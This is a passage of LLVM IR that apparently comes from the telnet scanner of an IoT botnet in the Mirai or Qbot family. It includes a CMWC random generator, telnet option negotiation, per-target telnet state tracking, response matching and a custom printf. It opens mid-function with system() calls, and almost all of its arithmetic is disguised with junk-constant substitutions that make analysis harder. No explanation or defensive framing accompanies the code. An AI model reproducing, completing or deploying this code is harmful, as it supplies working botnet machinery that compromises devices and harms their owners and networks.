  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, 519999868
  %7 = add i32 %6, -1640531527
  %8 = sub i32 %7, 519999868
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, -1640531527
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add i32 %10, -1640531527
  %16 = add i32 %14, -2132062503
  %17 = add i32 %16, -1640531527
  %18 = sub i32 %17, -2132062503
  %19 = add i32 %14, -1640531527
  store i32 %18, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %20

; <label>:20:                                     ; preds = %72, %1
  %21 = load i32, i32* %3, align 4
  %22 = icmp slt i32 %21, 4096
  br i1 %22, label %23, label %78

; <label>:23:                                     ; preds = %20
  %24 = load i32, i32* %3, align 4
  %25 = sub i32 %24, 714281619
  %26 = sub i32 %25, 3
  %27 = add i32 %26, 714281619
  %28 = sub nsw i32 %24, 3
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32, i32* %3, align 4
  %33 = add i32 %32, 1462371269
  %34 = sub i32 %33, 2
  %35 = sub i32 %34, 1462371269
  %36 = sub nsw i32 %32, 2
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %31, -1
  %41 = and i32 -2082440588, %40
  %42 = xor i32 -2082440588, -1
  %43 = and i32 %31, %42
  %44 = xor i32 %39, -1
  %45 = and i32 %44, -2082440588
  %46 = and i32 %39, %42
  %47 = or i32 %41, %43
  %48 = or i32 %45, %46
  %49 = xor i32 %47, %48
  %50 = xor i32 %31, %39
  %51 = xor i32 %49, -1
  %52 = and i32 1671089588, %51
  %53 = xor i32 1671089588, -1
  %54 = and i32 %49, %53
  %55 = xor i32 -1640531527, -1
  %56 = and i32 %55, 1671089588
  %57 = and i32 -1640531527, %53
  %58 = or i32 %52, %54
  %59 = or i32 %56, %57
  %60 = xor i32 %58, %59
  %61 = xor i32 %49, -1640531527
  %62 = load i32, i32* %3, align 4
  %63 = xor i32 %60, -1
  %64 = and i32 %62, %63
  %65 = xor i32 %62, -1
  %66 = and i32 %60, %65
  %67 = or i32 %64, %66
  %68 = xor i32 %60, %62
  %69 = load i32, i32* %3, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %70
  store i32 %67, i32* %71, align 4
  br label %72

; <label>:72:                                     ; preds = %23
  %73 = load i32, i32* %3, align 4
  %74 = add i32 %73, 1162417163
  %75 = add i32 %74, 1
  %76 = sub i32 %75, 1162417163
  %77 = add nsw i32 %73, 1
  store i32 %76, i32* %3, align 4
  br label %20

; <label>:78:                                     ; preds = %20
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 %5, 1351374857
  %7 = add i32 %6, 1
  %8 = add i32 %7, 1351374857
  %9 = add i32 %5, 1
  %10 = xor i32 4095, -1
  %11 = xor i32 %8, %10
  %12 = and i32 %11, %8
  %13 = and i32 %8, 4095
  store i32 %12, i32* @rand_cmwc.i, align 4
  %14 = load i64, i64* %2, align 8
  %15 = load i32, i32* @rand_cmwc.i, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = zext i32 %18 to i64
  %20 = mul i64 %14, %19
  %21 = load i32, i32* @c, align 4
  %22 = zext i32 %21 to i64
  %23 = sub i64 0, %20
  %24 = sub i64 0, %22
  %25 = add i64 %23, %24
  %26 = sub i64 0, %25
  %27 = add i64 %20, %22
  store i64 %26, i64* %1, align 8
  %28 = load i64, i64* %1, align 8
  %29 = lshr i64 %28, 32
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* @c, align 4
  %31 = load i64, i64* %1, align 8
  %32 = load i32, i32* @c, align 4
  %33 = zext i32 %32 to i64
  %34 = sub i64 0, %33
  %35 = sub i64 %31, %34
  %36 = add i64 %31, %33
  %37 = trunc i64 %35 to i32
  store i32 %37, i32* %3, align 4
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* @c, align 4
  %40 = icmp ult i32 %38, %39
  br i1 %40, label %41, label %54

; <label>:41:                                     ; preds = %0
  %42 = load i32, i32* %3, align 4
  %43 = sub i32 0, %42
  %44 = sub i32 0, 1
  %45 = add i32 %43, %44
  %46 = sub i32 0, %45
  %47 = add i32 %42, 1
  store i32 %46, i32* %3, align 4
  %48 = load i32, i32* @c, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add i32 %48, 1
  store i32 %52, i32* @c, align 4
  br label %54

; <label>:54:                                     ; preds = %41, %0
  %55 = load i32, i32* %4, align 4
  %56 = load i32, i32* %3, align 4
  %57 = sub i32 %55, 1565084110
  %58 = sub i32 %57, %56
  %59 = add i32 %58, 1565084110
  %60 = sub i32 %55, %56
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %62 = zext i32 %61 to i64
  %63 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %62
  store i32 %59, i32* %63, align 4
  ret i32 %59
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %18, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 0, 1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, 1
  store i32 %12, i32* %6, align 4
  %14 = sext i32 %12 to i64
  %15 = getelementptr inbounds i8*, i8** %9, i64 %14
  %16 = load i8*, i8** %15, align 8
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %8
  br label %8

; <label>:19:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %20

; <label>:20:                                     ; preds = %35, %19
  %21 = load i32, i32* %7, align 4
  %22 = load i32, i32* %6, align 4
  %23 = icmp slt i32 %21, %22
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %20
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %24
  store i32 1, i32* %3, align 4
  br label %42

; <label>:34:                                     ; preds = %24
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %7, align 4
  %37 = add i32 %36, 833405850
  %38 = add i32 %37, 1
  %39 = sub i32 %38, 833405850
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %7, align 4
  br label %20

; <label>:41:                                     ; preds = %20
  store i32 0, i32* %3, align 4
  br label %42

; <label>:42:                                     ; preds = %41, %33
  %43 = load i32, i32* %3, align 4
  ret i32 %43
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = xor i64 %37, -1
  %39 = xor i64 %31, -1
  %40 = xor i64 8027322090573197499, -1
  %41 = and i64 %38, 8027322090573197499
  %42 = and i64 %37, %40
  %43 = and i64 %39, 8027322090573197499
  %44 = and i64 %31, %40
  %45 = or i64 %41, %42
  %46 = or i64 %43, %44
  %47 = xor i64 %45, %46
  %48 = or i64 %38, %39
  %49 = xor i64 %48, -1
  %50 = or i64 8027322090573197499, %40
  %51 = and i64 %49, %50
  %52 = or i64 %47, %51
  %53 = or i64 %37, %31
  store i64 %52, i64* %36, align 8
  %54 = load i32, i32* %6, align 4
  %55 = sub i32 0, 1
  %56 = sub i32 %54, %55
  %57 = add nsw i32 %54, 1
  %58 = call i32 @select(i32 %56, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %59 = icmp slt i32 %58, 1
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %68

; <label>:61:                                     ; preds = %27
  %62 = load i32, i32* %6, align 4
  %63 = load i8*, i8** %8, align 8
  %64 = load i32, i32* %9, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @recv(i32 %62, i8* %63, i64 %65, i32 0)
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %5, align 4
  br label %68

; <label>:68:                                     ; preds = %61, %60
  %69 = load i32, i32* %5, align 4
  ret i32 %69
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = add i64 %7, 308559331714269655
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, 308559331714269655
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #9
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %28

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 %23, 1284949295
  %25 = add i32 %24, 1
  %26 = add i32 %25, 1284949295
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %4, align 4
  br label %13

; <label>:28:                                     ; preds = %13
  br label %29

; <label>:29:                                     ; preds = %44, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %42

; <label>:33:                                     ; preds = %29
  %34 = load i8*, i8** %2, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = call i32 @isspace(i32 %39) #9
  %41 = icmp ne i32 %40, 0
  br label %42

; <label>:42:                                     ; preds = %33, %29
  %43 = phi i1 [ false, %29 ], [ %41, %33 ]
  br i1 %43, label %44, label %50

; <label>:44:                                     ; preds = %42
  %45 = load i32, i32* %5, align 4
  %46 = add i32 %45, 1464848867
  %47 = add i32 %46, -1
  %48 = sub i32 %47, 1464848867
  %49 = add nsw i32 %45, -1
  store i32 %48, i32* %5, align 4
  br label %29

; <label>:50:                                     ; preds = %42
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %76

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = add i32 %63, -1593951762
  %66 = sub i32 %65, %64
  %67 = sub i32 %66, -1593951762
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, 1
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, 1
  store i32 %74, i32* %3, align 4
  br label %52

; <label>:76:                                     ; preds = %52
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, -1619585519
  %81 = sub i32 %80, %79
  %82 = add i32 %81, -1619585519
  %83 = sub nsw i32 %78, %79
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %77, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %329, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %332

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %316

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %332

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %317

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %85, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 0, 48
  %78 = add i32 %76, %77
  %79 = sub nsw i32 %76, 48
  %80 = load i32, i32* %7, align 4
  %81 = add i32 %80, 1817022366
  %82 = add i32 %81, %78
  %83 = sub i32 %82, 1817022366
  %84 = add nsw i32 %80, %78
  store i32 %83, i32* %7, align 4
  br label %85

; <label>:85:                                     ; preds = %71
  %86 = load i8*, i8** %5, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %5, align 8
  br label %59

; <label>:88:                                     ; preds = %69
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 115
